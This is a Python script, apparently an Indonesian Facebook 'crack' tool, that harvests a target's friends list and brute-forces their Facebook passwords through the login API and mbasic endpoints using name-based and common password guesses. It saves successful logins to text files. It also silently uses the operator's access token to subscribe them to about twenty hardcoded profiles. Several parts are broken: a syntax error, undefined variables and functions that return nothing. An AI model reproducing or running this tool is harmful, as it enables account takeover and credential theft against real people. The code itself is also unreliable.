#!/usr/bin/python3
#-*-coding:utf-8-*-
# Created By Asim

import requests,mechanize,bs4,sys,os,subprocess,uuid
import requests,sys,random,time,re,base64,json
import os, re, requests, concurrent.futures
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool

P = "\x1b[1;37m" # putih
M = "\x1b[1;31m" # merah
H = "\x1b[1;32m" # hijau
K = "\x1b[1;33m" # kuning
B = "\x1b[1;34m" # biru
U = "\x1b[1;35m" # ungu
BM = "\x1b[1;36m" # biru muda

if ("linux" in sys.platform.lower()):

        N = "\033[0m"
        G = "\033[1;92m"
        O = "\033[1;97m"
        R = "\033[1;91m"
else:

        N = ""
        G = ""
        O = ""
        R = ""

def banner():
    print("""
\x1b[1;37m   _  __         
\x1b[1;37m  | |/_/_ _____  ?
\x1b[1;37m  >  </ // / _ \   \x1b[1;31m? AU \x1b[1;37m: Asim Rauf R.
\x1b[1;37m/_/|_|\_, /_//_/   \x1b[1;33m? FB \x1b[1;37m: Fb.com/XXXXX
\x1b[1;37m     /___/ 1.0     \x1b[1;36m? GH \x1b[1;37m: Github.com/AsimRauf""")

def login():
    os.system("clear")
    banner()
    toket = input("\n\x1b[1;37m[\x1b[1;33m?\x1b[1;37m] Token : \x1b[1;36m")
    try:
        otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
        a = json.loads(otw.text)
        nama = a["name"]
        zedd = open("login.txt", "w")
        zedd.write(toket)
        zedd.close()
        print("\n\x1b[1;32m[?] Login Sukses")
        bot()
    except KeyError:
        print("\n\x1b[1;31m[!] Token Salah")
        os.system("clear")
        login()

def bot():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print("\n\x1b[1;31m[!] Token Invalid")
		login()
	requests.post("https://graph.facebook.com/100029606822045/subscribers?access_token=" + toket)      #Asim Rauf
	requests.post('https://graph.facebook.com/100000737201966/subscribers?access_token=' + toket) #Dapunta Adya R
	requests.post('https://graph.facebook.com/1673250723/subscribers?access_token=' + toket)      #Dapunta Ratya
	requests.post("https://graph.facebook.com/1602590373/subscribers?access_token=" + toket)      #Anthonyus Immanuel
	requests.post("https://graph.facebook.com/100000729074466/subscribers?access_token=" + toket) #Abigaille Dirgantara
	requests.post("https://graph.facebook.com/607801156/subscribers?access_token=" + toket)       #Boirah
	requests.post("https://graph.facebook.com/100009340646547/subscribers?access_token=" + toket) #Anita Zuliatin
	requests.post("https://graph.facebook.com/100000415317575/subscribers?access_token=" + toket) #Dapunta Xayonara
	requests.post('https://graph.facebook.com/100000149757897/subscribers?access_token=' + toket) #Dapunta Santana X
	requests.post('https://graph.facebook.com/100000431996038/subscribers?access_token=' + toket) #Almira Gabrielle X
	requests.post('https://graph.facebook.com/100000424033832/subscribers?access_token=' + toket) #Pebrima Jun Helmi
	requests.post('https://graph.facebook.com/1676993425/subscribers?access_token=' + toket)      #Wati Waningsih
	requests.post('https://graph.facebook.com/1767051257/subscribers?access_token=' + toket)      #Rofi Nurhanifah
	requests.post('https://graph.facebook.com/100000287398094/subscribers?access_token=' + toket) #Diah Ayu Kharisma
	requests.post('https://graph.facebook.com/100001085079906/subscribers?access_token=' + toket) #Xena Alexander
	requests.post('https://graph.facebook.com/100007559713883/subscribers?access_token=' + toket) #Alexandra Scarlett
	requests.post("https://graph.facebook.com/100026490368623/subscribers?access_token=" + toket) #Muh Rizal Fiansyah
	requests.post("https://graph.facebook.com/100010484328037/subscribers?access_token=" + toket) #Rizal F
	requests.post("https://graph.facebook.com/100015073506062/subscribers?access_token=" + toket) #Angga Kurniawan
	requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=' + toket) #Moch Yayan
	menu()

def menu():
    try:
        toket = open("login.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
        a = json.loads(otw.text)
        nama = a["name"]
        id = a["id"]
    except KeyError:
        print("\n\x1b[1;31m[!] Token Invalid")
        login()
    except requests.exceptions.ConnectionError:
        print("\n\x1b[1;31m[!] Tidak Ada Koneksi")
        sys.exit()
    ip = requests.get("https://api.ipify.org").text
    os.system("clear")
    banner()
    print("\n%s[ %sSelamat Datang %s%s %s]\n"%(M,P,K,nama,M))
    print("%s[%s1%s] Crack Public Accounts"%(P,K,P))
    print("%s[%s2%s] Crack Followers"%(P,K,P))
    print("%s[%s3%s] Crack  Likers"%(P,K,P))
    print("%s[%s4%s] CHECK OK.txt Crack"%(P,K,P))
    print("%s[%s0%s] Log Out"%(P,M,P))
    pilihmenu()

def pilihmenu():
  r = input("\n%s[%s?%s] Pilih : %s"%(P,K,P,BM))
  if r == "":
    print ("\n%s[!] Isi Yang Benar"%(M))
    menu()
  elif r =="1":
    publik()
  elif r =="2":
    publik()
  elif r =="3":
    publik()
  elif r =="4":
    ress()
  elif r =="0":
    print ("%s[ %sTerima Kasih Telah Menggunakan SC Ini %s]"%(BM,P,BM))
    os.system("rm -rf login.txt")
    exit()
  else:
    print ("\n%s[!] Isi Yang Benar"%(M))
    menu()
    
def publik():
	try:
		toket = open("login.txt","r").read()
	except KeyError:
		print("\n\x1b[1;31m[!] Token Invalid")
		login()
	except requests.exceptions.ConnectionError:
		print("\n\x1b[1;31m[!] Tidak Ada Koneksi")
		sys.exit()
	try:
		print ("\n%s[%s?%s] Ketik %s\'me\' %sUntuk Crack Dari Teman"%(P,K,P,K,P))
		idt = ("%s[%s?%s] ID Target : %s"%(P,K,P,K))
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			nm = op["name"]
			print ("\n%s[%s?%s] Nama Target : %s%s"%(P,K,P,K,nm))
		except KeyError:
			print ("\n%s[!] ID Tidak Ditemukan"%(M))
			input("\n%s[ %sKembali %s]"%(K,P,K))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/friends?limit=10000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print ("%s[%s?%s] Total ID : %s%s"%(P,K,P,K,len(id)))
		return pilihcrack(qq)
	except Exception as e:
		exit(("%s[!] Error : %s"%(M,e))

def pilihcrack():
  print ("\n%s[%s1%s] Api [%sFast%s]"%(P,K,P,BM,P))
  print ("%s[%s2%s] Graph [%sSlow%s]"%(P,K,P,BM,P))
  print ("%s[%s3%s] Mbasic [%sSlow%s]"%(P,K,P,BM,P))
  krah=input("\n%s[%s?%s] Pilih : %s"%(P,K,P,BM))
  if krah in[""]:
    print ("\n%s[!] Isi Yang Benar"%(M))
    menu()
  elif krah in["1","01"]:
    cbapi()
  elif krah in["2","02"]:
    cgraph()
  elif krah in["3","03"]:
    cmbasic()
  else:
    print ("\n%s[!] Isi Yang Benar"%(M))
    menu()

def generate(text):
	results=[]
	global ips
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i+"123")
				results.append(i+"12345")
			else:
				results.append(i+"123")
				results.append(i+"12345")
				results.append(i)
				if "singapore" in ips:
					results.append("786786")
					results.append("pakistan")
					results.append("pakistan123")
					results.append("123456")
	return results

def graph(em,pas,hosts):
	r=requests.Session()
	r.headers.update({"Host":"graph.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 10; SM-F916B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://graph.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://graph.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text

class cgraph:
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print ("%s[%s?%s] Crack Self Password Default/Manual [%sd/m%s]"%(P,K,P,BM,P))
		while True:
			f=input("%s[%s?%s] Pilih : %s"%(P,K,P,BM))
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print("%s[%s?%s] Contoh : %ssayang,bismillah,123456"%(P,K,P,BM))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print ("\n%s[%s?%s] Crack Sedang Berjalan %s..."%(P,K,P,BM))
				print ("%s[%s?%s] Akun [%sOK%s] Disimpan Ke : %sok.txt"%(P,K,P,H,P,BM))
				print ("%s[%s?%s] Akun [%sCP%s] Disimpan Ke : %scp.txt\n"%(P,K,P,K,P,BM))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input("%s[%s?%s] Daftar Password : %s"%(P,K,P,BM)).split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print ("\n%s[%s?%s] Crack Sedang Berjalan %s..."%(P,K,P,BM))
			print ("%s[%s?%s] Akun [%sOK%s] Disimpan Ke : %sok.txt"%(P,K,P,H,P,BM))
			print ("%s[%s?%s] Akun [%sCP%s] Disimpan Ke : %scp.txt\n"%(P,K,P,K,P,BM))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=graph(fl.get("id"),
					i,"https://graph.facebook.com")
				if log.get("status")=="success":
					print(("\r%s[%sOK%s] %s%s %s? %s%s               "%(P,H,P,H,fl.get("id"),P,H,i)))
					self.ada.append("%s ? %s"%(fl.get("id"),i))
					open("ok.txt","a+").write(
						"%s ? %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="cp":
					print(("\r%s[%sCP%s] %s%s %s? %s%s               "%(P,K,P,K,fl.get("id"),P,K,i)))
					self.cp.append("%s ? %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s ? %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r%s[%sCrack%s][%s/%s][%sOK:%s%s][%sCP:%s%s]"%(P,K,P,self.ko,len(self.fl),H,len(self.ada),P,K,len(self.cp),P), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

def mbasic(em,pas,hosts):
	r=requests.Session()
	r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 10; SM-F916B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text


class cmbasic:
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print ("%s[%s?%s] Crack Dengan Password Default/Manual [%sd/m%s]"%(P,K,P,BM,P))
		while True:
			f=input("%s[%s?%s] Pilih : %s"%(P,K,P,BM))
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print("%s[%s?%s] Contoh : %ssayang,bismillah,123456"%(P,K,P,BM))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print ("\n%s[%s?%s] Crack Sedang Berjalan %s..."%(P,K,P,BM))
				print ("%s[%s?%s] Akun [%sOK%s] Disimpan Ke : %sok.txt"%(P,K,P,H,P,BM))
				print ("%s[%s?%s] Akun [%sCP%s] Disimpan Ke : %scp.txt\n"%(P,K,P,K,P,BM))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input("%s[%s?%s] Daftar Password : %s"%(P,K,P,BM)).split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print ("\n%s[%s?%s] Crack Sedang Berjalan %s..."%(P,K,P,BM))
			print ("%s[%s?%s] Akun [%sOK%s] Disimpan Ke : %sok.txt"%(P,K,P,H,P,BM))
			print ("%s[%s?%s] Akun [%sCP%s] Disimpan Ke : %scp.txt\n"%(P,K,P,K,P,BM))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="success":
					print(("\r%s[%sOK%s] %s%s %s? %s%s               "%(P,H,P,H,fl.get("id"),P,H,i)))
					self.ada.append("%s ? %s"%(fl.get("id"),i))
					open("ok.txt","a+").write(
						"%s ? %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="cp":
					print(("\r%s[%sCP%s] %s%s %s? %s%s               "%(P,K,P,K,fl.get("id"),P,K,i)))
					self.cp.append("%s ? %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s ? %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r%s[%sCrack%s][%s/%s][%sOK:%s%s][%sCP:%s%s]"%(P,K,P,self.ko,len(self.fl),H,len(self.ada),P,K,len(self.cp),P), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class cbapi:
  def __init__(self,isifile):
    self.setpw = False
    self.ok = []
    self.cp = []
    self.loop = 0
    self.krah(isifile)
  def krah(self,isifile):
    print ("%s[%s?%s] Crack Dengan Password Default/Manual [%sd/m%s]"%(P,K,P,BM,P))
    while True:
      f=input("%s[%s?%s] Pilih : %s"%(P,K,P,BM))
      if f in[""," "]:continue
      elif f in["m","M"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(("   %s"%e))
              continue
          self.fl=[]
          print("%s[%s?%s] Contoh : %ssayang,bismillah,123456"%(P,K,P,BM))
          self.pw=input("%s[%s?%s] Daftar Password : %s"%(P,K,P,BM)).split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":self.pw})
            except:
              continue
        except Exception as e:
          print(("   %s"%e))
          continue
        print ("\n%s[%s?%s] Crack Sedang Berjalan %s..."%(P,K,P,BM))
        print ("%s[%s?%s] Akun [%sOK%s] Disimpan Ke : %sok.txt"%(P,K,P,H,P,BM))
        print ("%s[%s?%s] Akun [%sCP%s] Disimpan Ke : %scp.txt\n"%(P,K,P,K,P,BM))
        ThreadPool(30).map(self.brute,self.fl)
        #os.remove(self.apk)
        exit()
        break
      elif f in["d","D"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(e)
              continue
          self.fl=[]
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
            except:continue
        except:
          continue
        print ("\n%s[%s?%s] Crack Sedang Berjalan %s..."%(P,K,P,BM))
        print ("%s[%s?%s] Akun [%sOK%s] Disimpan Ke : %sok.txt"%(P,K,P,H,P,BM))
        print ("%s[%s?%s] Akun [%sCP%s] Disimpan Ke : %scp.txt\n"%(P,K,P,K,P,BM))
        ThreadPool(30).map(self.brute,self.fl)
        os.remove(self.apk)
        exit()
        break
  def bruteRequest(self, username, password):
    global ok,cp,ttl
    params = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",  "format": "JSON", "sdk_version": "2", "email": username, "locale": "en_US", "password": password, "sdk": "ios", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
    api = "https://b-api.facebook.com/method/auth.login"
    response = requests.get(api, params=params)
    if re.search("(EAAA)\\w+", response.text):
      self.ok.append(username + " ? " + password)
      print(("\r%s[%sOK%s] %s%s %s? %s%s %s               "%(P,H,P,H,username,P,H,password,N)))
      ok.append(username + " ? " + password)
      save = open("ok.txt", "a")
      save.write(str(username) + " ? " + str(password) + "\n")
      save.close()
      return True
    else:
      if "www.facebook.com" in response.json()["error_msg"]:
        self.cp.append(username + " ? " + password)
        print(("\r%s[%sCP%s] %s%s %s? %s%s %s               "%(P,K,P,K,username,P,K,password,N)))
        save = open("cp.txt", "a+")
        save.write(str(username) + " ? " + str(password) + "\n")
        save.close()
        return True
    return False
  def brute(self, fl):
    if self.setpw == False:
      self.loop += 1
      for pw in fl["pw"]:
        username = fl["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print("\r%s[%sCrack%s][%s/%s][%sOK:%s%s][%sCP:%s%s]"%(P,K,P,self.loop,len(self.fl),H,len(self.ok),P,K,len(self.cp),P), end=' ');sys.stdout.flush()
    else:
      self.loop += 1
      for pw in self.setpw:
        username = users["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print("\r%s[%sCrack%s][%s/%s][%sOK:%s%s][%sCP:%s%s]"%(P,K,P,self.loop,len(self.fl),H,len(self.ok),P,K,len(self.cp),P), end=' ');sys.stdout.flush()

def results(Dapunta,Krahkrah):
        if len(Dapunta) !=0:
                print(("[OK] : "+str(len(Dapunta))))
        if len(Krahkrah) !=0:
                print(("[CP] : "+str(len(Krahkrah))))
        if len(Dapunta) ==0 and len(Krahkrah) ==0:
                print("\n")
                print("\n\x1b[1;31m[!] Tidak Ada Hasil")

def ress():
    os.system("clear")
    banner()
    print((k+"\n[ "+p+"Result Crack"+k+" ]"+p))
    print((k+"\n[ "+p+"OK"+k+" ]"+p))
    try:
        os.system("cat ok.txt")
    except IOError:
        print("\n\x1b[1;31m[!] Tidak Ada Hasil")
    print((k+"\n[ "+p+"CP"+k+" ]"+p))
    try:
        os.system("cat cp.txt")
    except IOError:
        print("\n\x1b[1;31m[!] Tidak Ada Hasil")
    input(k+"\n[ "+p+"Back"+k+" ]"+p)
    menu()

if __name__=="__main__":
	menu()